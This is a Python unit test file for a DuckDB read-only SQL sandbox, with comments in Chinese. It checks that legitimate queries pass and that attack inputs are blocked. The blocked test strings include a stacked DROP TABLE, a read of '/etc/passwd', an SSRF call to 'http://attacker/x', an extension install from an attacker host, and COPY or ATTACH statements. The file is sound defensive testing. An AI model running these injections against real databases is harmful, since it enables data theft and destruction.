"""只读 SQL 沙箱（AST 校验）单元测试。

覆盖合法只读查询放行 + 各类攻击向量（多语句、文件读、SSRF、DDL/DML、
PRAGMA 泄露、扩展加载、命令执行）拦截。
"""
import os
import sys
import unittest

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(CURRENT_DIR)
for path in (PROJECT_ROOT, os.path.dirname(PROJECT_ROOT)):
    if path not in sys.path:
        sys.path.insert(0, path)

from database.duckdb_manager import _assert_read_only, SecurityError  # noqa: E402


class AssertReadOnlyTest(unittest.TestCase):
    # ── 合法只读查询应放行 ──
    def test_allows_simple_select(self):
        _assert_read_only("SELECT * FROM transactions")

    def test_allows_select_with_where(self):
        _assert_read_only("SELECT id, amount FROM transactions WHERE amount > 100")

    def test_allows_cte(self):
        _assert_read_only("WITH t AS (SELECT 1) SELECT * FROM t")

    def test_allows_union(self):
        _assert_read_only("SELECT * FROM a UNION SELECT * FROM b")

    def test_allows_join_and_subquery(self):
        _assert_read_only(
            "SELECT * FROM (SELECT id FROM a) x JOIN b ON x.id = b.id"
        )

    def test_allows_aggregation(self):
        _assert_read_only(
            "SELECT customer_id, COUNT(*) AS cnt, SUM(amount) AS total "
            "FROM transactions GROUP BY customer_id ORDER BY cnt DESC"
        )

    def test_allows_show_tables(self):
        _assert_read_only("SHOW TABLES")

    def test_allows_describe(self):
        _assert_read_only("DESCRIBE transactions")

    def test_allows_summarize(self):
        _assert_read_only("SUMMARIZE transactions")

    def test_allows_select_with_comment(self):
        _assert_read_only("SELECT * FROM transactions -- inline comment\nWHERE id=1")

    # ── 多语句注入应拦截 ──
    def test_blocks_multi_statement_drop(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("SELECT 1; DROP TABLE transactions")

    def test_blocks_multi_statement_insert(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("SELECT * FROM x; INSERT INTO y VALUES (1)")

    # ── 任意文件读应拦截 ──
    def test_blocks_read_csv_auto(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("SELECT * FROM read_csv_auto('/etc/passwd')")

    def test_blocks_read_json_ssrf(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("SELECT * FROM read_json('http://attacker/x')")

    def test_blocks_read_blob(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("SELECT * FROM read_blob('http://x')")

    def test_blocks_read_parquet(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("SELECT * FROM read_parquet('/secret.pq')")

    # ── DDL / DML 应拦截 ──
    def test_blocks_create(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("CREATE TABLE evil (a INT)")

    def test_blocks_insert(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("INSERT INTO x VALUES (1)")

    def test_blocks_update(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("UPDATE x SET a=1")

    def test_blocks_delete(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("DELETE FROM x")

    def test_blocks_drop(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("DROP TABLE x")

    def test_blocks_copy_to_file(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("COPY (SELECT * FROM x) TO '/tmp/out.csv'")

    def test_blocks_attach(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("ATTACH 'host=x' AS db")

    # ── 副作用 / 扩展 / 泄露语句应拦截 ──
    def test_blocks_pragma(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("PRAGMA database_list")

    def test_blocks_install_extension(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("INSTALL postgres FROM 'http://attacker'")

    def test_blocks_load_extension(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("LOAD postgres")

    def test_blocks_set(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("SET threads=4")

    def test_blocks_call(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("CALL my_proc()")

    def test_blocks_vacuum(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("VACUUM")

    # ── 边界 ──
    def test_blocks_empty(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("")

    def test_blocks_whitespace_only(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("   ")

    def test_blocks_unparseable(self):
        with self.assertRaises(SecurityError):
            _assert_read_only("SELECT FROM WHERE @@@@")


if __name__ == "__main__":
    unittest.main()
